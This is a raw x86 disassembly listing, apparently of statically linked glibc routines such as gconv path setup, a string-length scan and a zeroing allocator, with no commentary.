test byte [ebx + eax*2 + 1], 0x20
jne 0x80572e7
mov ebx, eax
mov esi, esi
mov edx, dword [0x80a99fc]
mov eax, edi
inc ecx
inc edi
mov edx, dword [edx + ebx*4]
mov byte [eax], dl
movzx eax, byte [ecx]
test al, al
je 0x80572e7
movsx eax, al
mov ebx, eax
mov eax, dword [0x80a99f4]
test byte [eax + ebx*2 + 1], 0x20
je 0x80572c0
cmp esi, edi
je 0x8057300
mov byte [edi], 0
mov eax, dword [var_10h]
inc edi
call fcn.080571c0
test eax, eax
je 0x8057308
nop
lea esi, [esi]
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
sub edi, dword [var_10h]
lea eax, [edi + 8]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x8057300
mov dword [var_8h], edi
lea eax, [eax + 8]
mov edx, dword [var_10h]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053770
sub esi, dword [var_10h]
mov dword [ebx], eax
add eax, esi
mov dword [ebx + 4], eax
mov dword [esp], ebx
mov dword [var_4h], 0x80aaca0
mov dword [var_8h], fcn.08056520
call fcn.0807a190
test eax, eax
je 0x805735c
cmp dword [eax], ebx
je 0x8057300
mov dword [arg_8h], ebx
add esp, 0x10
pop ebx
pop esi
pop edi
leave
jmp fcn.08051180
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x10
mov eax, dword [0x80aac84]
mov dword [var_14h], 0x80aac84
mov dword [var_10h], edx
test eax, eax
je 0x80573c2
mov ebx, eax
mov eax, dword [ebx]
mov esi, ebx
mov dword [var_4h], eax
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
mov edx, eax
je 0x80573cf
lea eax, [ebx + 0x14]
test edx, edx
mov dword [var_14h], eax
lea eax, [ebx + 0x1c]
cmovs eax, dword [var_14h]
mov dword [var_14h], eax
mov eax, dword [eax]
test eax, eax
mov ebx, eax
jne 0x8057390
mov eax, dword [var_14h]
mov dword [eax], edi
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [esi]
mov dword [var_4h], eax
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
jne 0x80573f9
mov eax, dword [esi + 4]
mov dword [var_4h], eax
mov eax, dword [edi + 4]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x8057408
lea eax, [esi + 0x18]
mov esi, dword [esi + 0x18]
mov dword [var_14h], eax
test esi, esi
jne 0x80573cf
jmp 0x80573c2
test esi, esi
je 0x80573c2
mov eax, dword [esi + 8]
cmp dword [edi + 8], eax
jl 0x805742f
je 0x8057427
mov eax, dword [var_10h]
test eax, eax
je 0x80573c7
mov dword [esp], edi
call fcn.08051180
jmp 0x80573c7
mov eax, dword [esi + 0xc]
cmp dword [edi + 0xc], eax
jge 0x8057416
mov eax, dword [esi + 0x14]
mov edx, dword [var_14h]
mov dword [edi + 0x14], eax
mov eax, dword [esi + 0x1c]
mov dword [edi + 0x1c], eax
mov eax, dword [esi + 0x18]
mov dword [edi + 0x18], eax
mov dword [edx], edi
mov dword [esp], esi
jmp 0x8057420
push ebp
mov eax, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x20
test eax, eax
je 0x805794e
mov dword [esp], 0x80aa868
call section.
mov eax, dword [0x80aacac]
test eax, eax
je 0x8057974
mov eax, 0
test eax, eax
je 0x805796c
mov dword [esp], 0x80aa868
call section.
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov ebx, dword [0x80aaca4]
test ebx, ebx
jne 0x8057bce
mov dword [esp], str._usr_lib_gconv
call fcn.08053400
lea edx, [eax + 1]
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_8h], edx
mov dword [var_4h], str._usr_lib_gconv
and eax, 0xfffffff0
mov dword [esp], eax
call fcn.08053770
mov dword [var_1ch], 0
mov dword [var_10h], eax
mov dword [var_14h], 0xf
mov dword [var_18h], 0
mov eax, dword [var_10h]
mov dword [var_4h], 0x3a
xor esi, esi
mov ebx, 1
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
mov ecx, eax
je 0x8057a16
lea esi, [esi]
lea eax, [esi + 1]
lea edx, [ebx + 1]
mov dword [var_4h], 0x3a
cmp ecx, eax
mov esi, ecx
lea eax, [ecx + 1]
mov dword [esp], eax
cmovne ebx, edx
call fcn.08076ce0
test eax, eax
mov ecx, eax
jne 0x80579f0
mov edx, dword [var_14h]
mov ecx, dword [var_1ch]
lea edi, [ebx*8]
inc ecx
lea eax, [edx + edi]
lea edx, [ebx - 1]
imul edx, ecx
add eax, ebx
lea eax, [edx + eax + 8]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8057b5c
mov edx, dword [var_10h]
lea ecx, [edi + eax + 8]
mov dword [0x80aaca8], 0
xor edi, edi
movzx eax, byte [edx]
cmp al, 0x3a
je 0x8057bc1
xor ebx, ebx
test al, al
je 0x8057a88
mov eax, edx
inc edx
mov ebx, eax
movzx eax, byte [edx]
test al, al
je 0x8057a85
inc edx
cmp al, 0x3a
je 0x8057bb8
movzx eax, byte [edx]
test al, al
jne 0x8057a75
mov dword [var_10h], edx
test ebx, ebx
je 0x8057b97
mov dword [esi + edi*8], ecx
cmp byte [ebx], 0x2f
je 0x8057abf
mov eax, dword [var_18h]
test eax, eax
je 0x8057b73
mov eax, dword [var_1ch]
mov edx, dword [var_18h]
mov dword [esp], ecx
mov dword [var_8h], eax
mov dword [var_4h], edx
call fcn.08053740
mov ecx, eax
mov byte [eax], 0x2f
inc ecx
mov dword [esp], ecx
mov dword [var_4h], ebx
call fcn.080773c0
cmp byte [eax - 1], 0x2f
mov ecx, eax
je 0x8057ad7
mov byte [eax], 0x2f
inc ecx
mov edx, ecx
mov eax, dword [0x80aaca8]
sub edx, dword [esi + edi*8]
cmp edx, eax
mov dword [esi + edi*8 + 4], edx
cmova eax, edx
inc edi
mov dword [0x80aaca8], eax
mov byte [ecx], 0
mov edx, dword [var_10h]
inc ecx
movzx eax, byte [edx]
cmp al, 0x3a
je 0x8057b69
xor ebx, ebx
test al, al
je 0x8057b1f
mov eax, edx
inc edx
mov ebx, eax
movzx eax, byte [edx]
test al, al
je 0x8057b1c
inc edx
cmp al, 0x3a
je 0x8057b63
movzx eax, byte [edx]
test al, al
jne 0x8057b10
mov dword [var_10h], edx
test ebx, ebx
jne 0x8057a90
test esi, esi
mov dword [esi + edi*8], 0
mov dword [esi + edi*8 + 4], 0
mov eax, esi
je 0x8057b5c
mov edi, dword [var_18h]
mov dword [0x80aacac], eax
test edi, edi
je 0x8057957
mov eax, dword [var_18h]
mov dword [esp], eax
call fcn.08051180
jmp 0x8057957
mov eax, 0x80aa880
jmp 0x8057b3c
mov byte [edx - 1], 0
jmp 0x8057b1c
inc edx
movzx eax, byte [edx]
cmp al, 0x3a
je 0x8057b69
jmp 0x8057afe
mov dword [var_sp_ch], str.__gconv_get_path
mov dword [var_8h], 0x1f6
mov dword [var_4h], str.gconv_conf.c
mov dword [esp], str.cwd_____void__0_
call fcn.0805efc0
mov dword [var_sp_ch], str.__gconv_get_path
mov dword [var_8h], 0x1f0
mov dword [var_4h], str.gconv_conf.c
mov dword [esp], str.elem_____void__0_
jmp 0x8057b92
mov byte [edx - 1], 0
jmp 0x8057a85
inc edx
movzx eax, byte [edx]
cmp al, 0x3a
je 0x8057bc1
jmp 0x8057a63
mov dword [esp], ebx
call fcn.08053400
lea edx, [eax + 0x10]
mov dword [var_14h], edx
lea edx, [eax + 0x22]
and edx, 0xfffffffc
sub esp, edx
lea edx, [var_1fh]
mov dword [var_8h], eax
mov dword [var_4h], ebx
and edx, 0xfffffff0
mov dword [var_10h], edx
mov dword [esp], edx
call fcn.08053740
mov byte [eax], 0x3a
mov dword [var_4h], str._usr_lib_gconv
mov dword [var_8h], 0xf
inc eax
mov dword [esp], eax
call fcn.08053740
mov dword [esp], 0
mov dword [var_4h], 0
call fcn.08079700
mov dword [var_18h], eax
mov dword [esp], eax
call fcn.08053400
mov dword [var_1ch], eax
jmp 0x80579cc
push ebp
mov ebp, esp
sub esp, 0x38
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [0x80aa888]
mov esi, edx
mov dword [var_18h], ecx
mov edi, eax
mov edx, 2
test ebx, ebx
je 0x805ce05
movzx eax, word [ebx + 4]
lea edx, [var_10h]
lea eax, [eax + ebx]
mov dword [var_1ch], eax
movzx eax, word [ebx + 0xa]
lea eax, [eax + ebx]
mov dword [var_20h], eax
mov eax, esi
call fcn.0805cb70
test eax, eax
jne 0x805ce00
mov eax, dword [var_10h]
movzx edx, word [ebx + 0xa]
lea eax, [eax + eax*2]
shl eax, 2
lea edx, [eax + edx + 0xc]
cmp edx, dword [0x80aa88c]
jbe 0x805ce14
mov edx, 1
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov eax, edx
mov edi, dword [var_4h]
leave
ret 8
add eax, dword [var_20h]
lea edx, [var_14h]
mov dword [var_24h], eax
mov eax, edi
call fcn.0805cb70
test eax, eax
jne 0x805ce00
mov ecx, dword [var_14h]
movzx edx, word [ebx + 0xa]
lea eax, [ecx + ecx*2]
shl eax, 2
lea edx, [eax + edx + 0xc]
cmp edx, dword [0x80aa88c]
ja 0x805ce00
mov edi, dword [var_20h]
add edi, eax
test byte [arg_ch], 1
jne 0x805d11d
mov esi, dword [var_10h]
test esi, esi
je 0x805ce78
test ecx, ecx
je 0x805ce6a
mov eax, dword [var_24h]
movzx edx, word [eax + 0xa]
test edx, edx
jne 0x805cfd7
test esi, esi
je 0x805ce78
mov ecx, dword [var_24h]
cmp word [ecx + 4], 0
je 0x805ce00
mov eax, dword [var_14h]
test eax, eax
je 0x805ce8a
cmp word [edi + 8], 0
je 0x805ce00
test esi, esi
jne 0x805ce96
test eax, eax
je 0x805ce00
mov dword [esp], 0x78
call fcn.08050fe0
mov edx, 3
test eax, eax
mov ebx, eax
je 0x805ce05
mov edx, dword [arg_8h]
mov eax, dword [var_18h]
mov dword [edx], 0
mov dword [eax], ebx
mov esi, dword [var_10h]
test esi, esi
je 0x805cf18
mov ecx, dword [var_24h]
mov edx, dword [var_1ch]
mov dword [ebx + 0x10], 0x8093633
mov dword [ebx + 8], 1
mov dword [ebx + 0x38], 0
movzx eax, word [ecx]
add eax, dword [var_1ch]
mov dword [ebx + 0xc], eax
movzx eax, word [ecx + 6]
cmp byte [eax + edx], 0
je 0x805cfc1
movzx edx, word [ecx + 8]
add eax, dword [var_1ch]
mov ecx, ebx
add edx, dword [var_1ch]
call fcn.0805cc50
test eax, eax
mov esi, eax
jne 0x805cfb2
mov eax, dword [arg_8h]
inc dword [eax]
mov ecx, dword [var_14h]
test ecx, ecx
je 0x805cf7e
mov edx, dword [arg_8h]
mov ecx, dword [var_1ch]
mov esi, dword [edx]
mov eax, esi
shl eax, 4
sub eax, esi
lea edx, [eax*4]
movzx eax, word [edi]
add eax, dword [var_1ch]
mov dword [ebx + edx + 0xc], 0x8093633
mov dword [ebx + edx + 8], 1
mov dword [ebx + edx + 0x38], 0
mov dword [ebx + edx + 0x10], eax
movzx eax, word [edi + 2]
cmp byte [eax + ecx], 0
je 0x805cfa1
lea ecx, [edx + ebx]
add eax, dword [var_1ch]
movzx edx, word [edi + 4]
add edx, dword [var_1ch]
call fcn.0805cc50
test eax, eax
mov edi, eax
jne 0x805cf85
mov eax, dword [arg_8h]
inc dword [eax]
xor edx, edx
jmp 0x805ce05
test esi, esi
jne 0x805cf98
mov dword [esp], ebx
call fcn.08051180
mov edx, edi
jmp 0x805ce05
mov eax, ebx
call fcn.08056690
jmp 0x805cf89
movzx eax, word [edi + 4]
lea edx, [edx + ebx]
add eax, dword [var_1ch]
call fcn.08057dc0
jmp 0x805cf79
mov dword [esp], ebx
call fcn.08051180
mov edx, esi
jmp 0x805ce05
mov ecx, dword [var_24h]
mov edx, ebx
movzx eax, word [ecx + 8]
add eax, dword [var_1ch]
call fcn.08057dc0
jmp 0x805cf13
movzx eax, word [ebx + 0xc]
add eax, dword [0x80aa888]
add eax, edx
lea edx, [eax - 1]
movzx eax, word [eax - 1]
mov dword [var_28h], edx
test ax, ax
je 0x805d02b
movzx eax, ax
lea eax, [eax + eax*2]
movzx eax, word [edx + eax*2 - 4]
cmp eax, ecx
je 0x805d02b
mov edx, dword [var_28h]
movzx eax, word [edx]
lea eax, [eax + eax*2]
lea eax, [edx + eax*2]
lea edx, [eax + 2]
movzx eax, word [eax + 2]
mov dword [var_28h], edx
test ax, ax
je 0x805d02b
movzx eax, ax
lea eax, [eax + eax*2]
movzx eax, word [edx + eax*2 - 4]
cmp eax, ecx
jne 0x805d001
mov ecx, dword [var_28h]
movzx eax, word [ecx]
test ax, ax
je 0x805ce6a
movzx edx, ax
mov eax, dword [arg_8h]
mov dword [eax], edx
mov eax, edx
shl eax, 4
sub eax, edx
shl eax, 2
mov dword [esp], eax
call fcn.08050fe0
mov edx, dword [var_18h]
test eax, eax
mov ebx, eax
mov dword [edx], eax
mov edx, 3
je 0x805ce05
mov ecx, dword [var_24h]
mov dword [var_30h], 0
mov esi, dword [var_28h]
mov dword [var_34h], 0
movzx eax, word [ecx]
add eax, dword [var_1ch]
mov dword [var_2ch], eax
mov edx, dword [var_2ch]
mov eax, dword [var_34h]
mov ecx, dword [var_20h]
mov dword [ebx + eax + 0xc], edx
mov edx, dword [var_34h]
movzx eax, word [esi + 2]
mov dword [ebx + edx + 8], 1
mov dword [ebx + edx + 0x38], 0
lea eax, [eax + eax*2]
movzx eax, word [ecx + eax*4]
mov ecx, dword [var_1ch]
add eax, dword [var_1ch]
mov dword [ebx + edx + 0x10], eax
mov dword [var_2ch], eax
movzx eax, word [esi + 4]
cmp byte [eax + ecx], 0
je 0x805d109
lea ecx, [edx + ebx]
add eax, dword [var_1ch]
movzx edx, word [esi + 6]
add edx, dword [var_1ch]
call fcn.0805cc50
test eax, eax
jne 0x805d0f9
mov edx, dword [var_28h]
inc dword [var_30h]
add esi, 6
add dword [var_34h], 0x3c
movzx eax, word [edx]
xor edx, edx
cmp dword [var_30h], eax
jl 0x805d085
jmp 0x805ce05
mov dword [esp], ebx
call fcn.08051180
mov esi, dword [var_10h]
jmp 0x805ce6a
mov eax, dword [var_34h]
lea edx, [eax + ebx]
movzx eax, word [esi + 6]
add eax, dword [var_1ch]
call fcn.08057dc0
jmp 0x805d0dd
mov esi, dword [var_10h]
mov edx, 1
cmp esi, ecx
jne 0x805ce53
jmp 0x805ce05
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x38
test edx, edx
mov dword [var_2ch], 0x7fffffff
mov dword [var_14h], edx
mov dword [var_10h], eax
mov dword [var_18h], ecx
mov edx, eax
mov dword [var_24h], 0
mov dword [var_28h], 0x7fffffff
mov eax, dword [arg_8h]
cmovne edx, dword [var_14h]
test eax, eax
mov eax, ecx
mov ecx, dword [arg_10h]
cmovne eax, dword [arg_8h]
mov dword [esp], ecx
mov ecx, dword [arg_ch]
call fcn.08056580
sub esp, 4
mov dword [var_30h], eax
test eax, eax
je 0x8056e66
mov eax, dword [arg_8h]
test eax, eax
je 0x8056e19
sub esp, 0x2c
mov eax, dword [arg_8h]
lea ebx, [var_17h]
and ebx, 0xfffffff0
mov dword [ebx], eax
mov dword [esp], eax
call fcn.08053400
mov edx, dword [var_18h]
sub esp, 0x2c
mov dword [ebx + 4], eax
mov dword [ebx + 0xc], 0
mov dword [ebx + 8], 0
mov dword [ebx + 0x10], 0
mov dword [ebx + 0x14], 0
mov dword [ebx + 0x18], 0
mov dword [var_1ch], ebx
lea ebx, [var_17h_2]
and ebx, 0xfffffff0
mov dword [ebx], edx
mov dword [esp], edx
call fcn.08053400
mov ecx, dword [var_1ch]
mov dword [ebx + 0x18], 0
mov dword [ebx + 4], eax
mov dword [ebx + 0xc], 0
mov dword [ebx + 8], 0
mov dword [ebx + 0x10], 0
mov dword [ebx + 0x14], 0
mov dword [ecx + 0x18], ebx
add ebx, 0x18
mov dword [var_20h], ebx
mov edi, dword [var_1ch]
test edi, edi
je 0x8056b58
mov ecx, dword [var_28h]
cmp dword [edi + 0xc], ecx
jle 0x8056b6c
mov edi, dword [edi + 0x18]
test edi, edi
jne 0x8056a95
mov eax, dword [var_24h]
test eax, eax
je 0x8056b58
mov ecx, dword [var_24h]
mov edx, dword [ecx + 0x18]
test edx, edx
je 0x8056acb
mov eax, dword [ecx + 0xc]
cmp dword [edx + 0xc], eax
jl 0x8056b50
je 0x8056b44
mov eax, dword [arg_8h]
mov edi, dword [var_14h]
mov ecx, dword [var_18h]
mov edx, dword [var_10h]
test eax, eax
mov eax, dword [arg_10h]
cmovne ecx, dword [arg_8h]
test edi, edi
cmovne edx, dword [var_14h]
mov dword [var_4h], eax
mov eax, dword [arg_ch]
mov dword [esp], eax
mov eax, dword [var_24h]
call fcn.080566e0
sub esp, 8
mov dword [var_30h], eax
mov esi, dword [var_14h]
mov eax, dword [var_10h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_8h]
mov edx, dword [var_18h]
test esi, esi
cmovne eax, dword [var_14h]
test ebx, ebx
cmovne edx, dword [arg_8h]
mov dword [var_10h], eax
mov eax, dword [ecx]
mov dword [var_18h], edx
mov edx, dword [var_10h]
mov dword [esp], eax
mov eax, dword [arg_ch]
mov ecx, dword [eax]
mov eax, dword [var_18h]
call fcn.080565e0
sub esp, 4
mov eax, dword [var_30h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 0xc
mov eax, dword [ecx + 8]
cmp dword [edx + 8], eax
jge 0x8056acb
mov dword [var_24h], edx
jmp 0x8056acb
mov edx, dword [arg_ch]
mov ecx, dword [arg_10h]
mov dword [edx], 0
mov dword [ecx], 0
jmp 0x8056afe
je 0x8056e08
mov ebx, dword [0x80aac84]
test ebx, ebx
je 0x8056aa1
mov eax, dword [ebx]
mov dword [var_4h], eax
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x8056ba7
jl 0x8056ba2
mov ebx, dword [ebx + 0x1c]
test ebx, ebx
jne 0x8056b80
jmp 0x8056aa1
mov ebx, dword [ebx + 0x14]
jmp 0x8056b99
mov dword [var_34h], ebx
lea esi, [esi]
mov edx, dword [var_34h]
mov eax, dword [edx + 4]
cmp byte [eax], 0x2d
jne 0x8056e01
cmp byte [eax + 1], 0
jne 0x8056e01
mov eax, dword [var_14h]
mov esi, dword [var_10h]
test eax, eax
cmovne esi, dword [var_14h]
mov eax, dword [var_34h]
mov ecx, dword [edi + 0xc]
mov edx, dword [edi + 8]
mov eax, dword [eax + 8]
add ecx, eax
mov eax, dword [var_10h]
mov dword [var_38h], ecx
mov ecx, dword [var_34h]
mov ecx, dword [ecx + 0xc]
mov dword [esp], esi
mov dword [var_4h], eax
add edx, ecx
mov dword [var_3ch], edx
call fcn.08076e50
test eax, eax
je 0x8056c26
mov eax, dword [var_14h]
test eax, eax
je 0x8056ce1
mov edx, dword [var_14h]
mov dword [esp], esi
mov dword [var_4h], edx
call fcn.08076e50
test eax, eax
jne 0x8056ce1
mov ebx, dword [var_24h]
test ebx, ebx
je 0x8056c49
lea esi, [esi]
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08076e50
test eax, eax
je 0x8056cb4
mov ebx, dword [ebx + 0x18]
test ebx, ebx
jne 0x8056c30
sub esp, 0x2c
lea ebx, [var_17h_2]
and ebx, 0xfffffff0
mov dword [ebx], esi
mov dword [esp], esi
call fcn.08053400
mov dword [ebx + 0x14], edi
mov edx, dword [var_34h]
mov ecx, dword [var_38h]
mov dword [ebx + 4], eax
mov eax, dword [var_3ch]
mov dword [ebx + 0x10], edx
mov dword [ebx + 0xc], ecx
mov dword [ebx + 8], eax
mov ecx, dword [var_24h]
mov dword [var_24h], ebx
mov dword [ebx + 0x18], ecx
mov ecx, dword [var_28h]
cmp dword [var_38h], ecx
jl 0x8056ca6
je 0x8056c9e
mov eax, dword [var_34h]
mov eax, dword [eax + 0x18]
test eax, eax
mov dword [var_34h], eax
jne 0x8056bb0
jmp 0x8056aa1
mov eax, dword [var_2ch]
cmp dword [var_3ch], eax
jge 0x8056c88
mov edx, dword [var_38h]
mov ecx, dword [var_3ch]
mov dword [var_28h], edx
mov dword [var_2ch], ecx
jmp 0x8056c88
test ebx, ebx
je 0x8056c49
mov eax, dword [var_38h]
cmp dword [ebx + 0xc], eax
jg 0x8056cca
jne 0x8056c7e
mov edx, dword [var_3ch]
cmp dword [ebx + 8], edx
jle 0x8056c7e
mov ecx, dword [var_34h]
mov eax, dword [var_38h]
mov dword [ebx + 0x14], edi
mov edx, dword [var_3ch]
mov dword [ebx + 0x10], ecx
mov dword [ebx + 0xc], eax
mov dword [ebx + 8], edx
jmp 0x8056c7e
mov eax, dword [var_28h]
cmp dword [var_38h], eax
jl 0x8056cf3
jne 0x8056c88
mov edx, dword [var_2ch]
cmp dword [var_3ch], edx
jge 0x8056c88
mov ebx, dword [var_1ch]
test ebx, ebx
je 0x8056d19
lea esi, [esi]
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08076e50
test eax, eax
je 0x8056d5c
mov ebx, dword [ebx + 0x18]
test ebx, ebx
jne 0x8056d00
sub esp, 0x2c
lea ebx, [var_17h_2]
and ebx, 0xfffffff0
mov dword [ebx], esi
mov dword [esp], esi
call fcn.08053400
mov dword [ebx + 0x18], 0
mov dword [ebx + 0x14], edi
mov ecx, dword [var_38h]
mov dword [ebx + 4], eax
mov edx, dword [var_34h]
mov eax, dword [var_3ch]
mov dword [ebx + 0xc], ecx
mov dword [ebx + 0x10], edx
mov ecx, dword [var_20h]
mov dword [ebx + 8], eax
mov dword [ecx], ebx
add ebx, 0x18
mov dword [var_20h], ebx
jmp 0x8056c88
test ebx, ebx
je 0x8056d19
mov eax, dword [var_38h]
cmp dword [ebx + 0xc], eax
jg 0x8056d7a
jne 0x8056c88
mov edx, dword [var_3ch]
cmp dword [ebx + 8], edx
jle 0x8056c88
mov ecx, dword [var_34h]
mov dword [ebx + 0x14], edi
mov dword [ebx + 0x10], ecx
mov ebx, dword [var_1ch]
test ebx, ebx
je 0x8056dbe
mov eax, dword [ebx + 0x10]
test eax, eax
je 0x8056db7
mov edx, dword [ebx + 0x14]
mov ecx, dword [eax + 8]
mov esi, dword [eax + 0xc]
mov eax, dword [edx + 0x10]
test eax, eax
je 0x8056db1
mov edx, dword [edx + 0x14]
add ecx, dword [eax + 8]
add esi, dword [eax + 0xc]
mov eax, dword [edx + 0x10]
test eax, eax
jne 0x8056da1
mov dword [ebx + 0xc], ecx
mov dword [ebx + 8], esi
mov ebx, dword [ebx + 0x18]
test ebx, ebx
jne 0x8056d8a
mov ebx, dword [var_24h]
test ebx, ebx
je 0x8056c88
mov edx, dword [ebx + 0x10]
mov eax, dword [ebx + 0x14]
mov ecx, dword [eax + 0xc]
mov eax, dword [eax + 8]
add ecx, dword [edx + 8]
mov dword [ebx + 0xc], ecx
add eax, dword [edx + 0xc]
cmp ecx, dword [var_28h]
mov dword [ebx + 8], eax
jl 0x8056df9
je 0x8056df4
mov ebx, dword [ebx + 0x18]
test ebx, ebx
jne 0x8056dc9
jmp 0x8056c88
cmp eax, dword [var_2ch]
jge 0x8056de8
mov dword [var_28h], ecx
mov dword [var_2ch], eax
jmp 0x8056de8
mov esi, eax
jmp 0x8056bd5
mov eax, dword [var_2ch]
cmp dword [edi + 8], eax
jge 0x8056aa1
jmp 0x8056b72
sub esp, 0x2c
mov eax, dword [var_18h]
lea ebx, [var_17h]
and ebx, 0xfffffff0
mov dword [ebx], eax
mov dword [esp], eax
call fcn.08053400
mov edx, ebx
mov dword [var_1ch], ebx
add edx, 0x18
mov dword [ebx + 4], eax
mov dword [ebx + 0xc], 0
mov dword [ebx + 8], 0
mov dword [ebx + 0x10], 0
mov dword [ebx + 0x14], 0
mov dword [ebx + 0x18], 0
mov dword [var_20h], edx
jmp 0x8056a8a
mov eax, dword [arg_10h]
mov ecx, dword [arg_ch]
mov edx, dword [eax]
mov eax, dword [ecx]
call fcn.080568e0
jmp 0x8056b3a
push ebp
mov ebp, esp
sub esp, 4
mov edx, dword [0x80aa888]
test edx, edx
jne 0x805d152
leave
ret
mov dword [esp], eax
call fcn.08051180
jmp 0x805d150
push ebp
mov ebp, esp
push esi
mov esi, eax
push ebx
sub esp, 8
mov ebx, dword [0x80aac84]
test ebx, ebx
je 0x80571f4
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08076e50
mov edx, 1
test eax, eax
je 0x80571fb
jl 0x8057204
mov ebx, dword [ebx + 0x1c]
test ebx, ebx
jne 0x80571d4
xor edx, edx
test ebx, ebx
setne dl
add esp, 8
mov eax, edx
pop ebx
pop esi
leave
ret
mov ebx, dword [ebx + 0x14]
jmp 0x80571f0
push ebp
xor edx, edx
mov ebp, esp
push esi
mov eax, dword [arg_ch]
mov esi, dword [arg_8h]
push ebx
test eax, eax
lea ebx, [eax + esi]
je 0x8076fae
cmp ebx, esi
mov eax, 0xffffffff
cmovb ebx, eax
test esi, 3
mov eax, esi
je 0x8076f62
cmp byte [eax], 0
je 0x8076fa5
inc eax
test al, 3
jne 0x8076f58
cmp eax, ebx
mov edx, eax
jae 0x8076fa5
mov eax, dword [edx]
add edx, 4
sub eax, 0x1010101
test eax, 0x80808080
je 0x8076f9f
cmp byte [edx - 4], 0
lea ecx, [edx - 4]
mov eax, ecx
je 0x8076fa5
cmp byte [ecx + 1], 0
lea eax, [edx - 3]
je 0x8076fa5
cmp byte [ecx + 2], 0
lea eax, [edx - 2]
je 0x8076fa5
cmp byte [ecx + 3], 0
lea eax, [edx - 1]
je 0x8076fa5
cmp edx, ebx
mov eax, ebx
jb 0x8076f68
cmp eax, ebx
mov edx, ebx
cmovbe edx, eax
sub edx, esi
pop ebx
pop esi
mov eax, edx
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov ebx, dword [0x80a950c]
mov edx, dword [arg_ch]
mov ecx, dword [arg_8h]
mov eax, ecx
mov edi, ecx
or eax, edx
imul edi, edx
cmp eax, 0xffff
ja 0x80519ec
test ebx, ebx
je 0x805178d
mov eax, dword [arg_4h]
mov dword [esp], edi
mov dword [var_4h], eax
call ebx
mov esi, eax
xor eax, eax
test esi, esi
je 0x8051785
mov dword [var_8h], edi
mov dword [var_4h], 0
mov dword [esp], esi
call fcn.080536f0
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov eax, 0
test eax, eax
je 0x80519e1
mov dword [esp], 0
call section.
mov esi, eax
test esi, esi
mov ebx, esi
je 0x80519c0
mov eax, 0
test eax, eax
je 0x80519d0
mov dword [esp], esi
call section.
test eax, eax
jne 0x80519c0
nop
xor eax, eax
test ebx, ebx
je 0x8051785
mov eax, dword [ebx + 0x54]
mov edx, dword [eax + 4]
mov dword [var_10h], eax
mov dword [esp], ebx
mov dword [var_4h], edi
and edx, 0xfffffff8
mov dword [var_14h], edx
call fcn.08051cf0
mov esi, eax
mov eax, 0
test eax, eax
je 0x80519b3
mov dword [esp], ebx
call section.
test esi, esi
je 0x80518c2
lea ecx, [esi - 8]
mov eax, esi
mov edx, dword [ecx + 4]
mov ebx, edx
and ebx, 2
jne 0x8051785
mov eax, edx
and eax, 0xfffffff8
cmp ecx, dword [var_10h]
je 0x80518b6
lea edx, [eax - 4]
mov ecx, edx
shr ecx, 2
cmp ecx, 9
jbe 0x8051867
cld
mov edi, esi
mov eax, ebx
test dl, 2
rep stosd dword es:[edi], eax
je 0x8051852
mov word [edi], 0
add edi, 2
and edx, 1
je 0x8051860
mov byte [edi], 0
lea esi, [esi]
mov eax, esi
jmp 0x8051785
cmp ecx, 4
mov dword [esi], 0
mov dword [esi + 4], 0
mov dword [esi + 8], 0
jbe 0x8051860
cmp ecx, 6
mov dword [esi + 0xc], 0
mov dword [esi + 0x10], 0
jbe 0x8051860
cmp ecx, 8
mov dword [esi + 0x14], 0
mov dword [esi + 0x18], 0
jbe 0x8051860
mov dword [esi + 0x1c], 0
mov dword [esi + 0x20], 0
jmp 0x8051860
cmp eax, dword [var_14h]
cmova eax, dword [var_14h]
jmp 0x8051831
cmp ebx, 0x80aa360
je 0x805192d
mov eax, 0
test eax, eax
je 0x8051921
mov dword [esp], 0x80aa360
call section.
mov dword [var_4h], edi
mov dword [esp], 0x80aa360
call fcn.08051cf0
mov edx, 0
mov esi, eax
test edx, edx
je 0x8051915
mov dword [esp], 0x80aa360
call section.
xor eax, eax
test esi, esi
jne 0x8051810
jmp 0x8051785
mov dword [0x80aa360], 0
jmp 0x8051906
mov dword [0x80aa360], 1
jmp 0x80518df
mov eax, 0
test eax, eax
je 0x80519a7
mov dword [esp], 0x80aa360
call section.
mov edx, dword [ebx + 0x46c]
xor eax, eax
test edx, edx
mov edx, edi
cmovne eax, ebx
call fcn.0804f920
mov ebx, eax
mov eax, 0
test eax, eax
je 0x805199b
mov dword [esp], 0x80aa360
call section.
test ebx, ebx
je 0x8051906
mov dword [var_4h], edi
mov dword [esp], ebx
call fcn.08051cf0
mov edx, 0
mov esi, eax
test edx, edx
je 0x8051990
mov dword [esp], ebx
jmp 0x8051901
mov dword [ebx], 0
jmp 0x8051906
mov dword [0x80aa360], 0
jmp 0x805196d
mov dword [0x80aa360], 1
jmp 0x8051942
mov dword [ebx], 0
jmp 0x8051808
mov esi, esi
mov edx, edi
mov eax, esi
call fcn.0804f920
mov ebx, eax
jmp 0x80517d0
mov ecx, dword [esi]
test ecx, ecx
jne 0x80519c0
mov dword [esi], 1
jmp 0x80517d0
